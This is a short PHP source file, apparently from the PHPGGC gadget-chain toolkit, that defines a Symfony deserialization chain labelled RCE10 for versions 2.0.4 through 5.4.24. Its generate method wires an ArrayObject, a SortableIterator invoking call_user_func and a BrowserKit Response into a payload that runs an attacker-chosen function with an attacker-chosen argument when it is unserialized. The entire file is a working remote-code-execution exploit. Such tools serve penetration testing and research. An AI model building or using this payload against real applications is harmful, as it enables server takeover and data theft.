<?php

namespace GadgetChain\Symfony;

class RCE10 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.4 <= 5.4.24 (all)';
    public static $vector = '__toString';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        $a = new \ArrayObject([
            $parameters["function"],
            $parameters["parameter"]
        ]);
        $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
        $c = new \Symfony\Component\BrowserKit\Response($b);
        return $c;
    }
}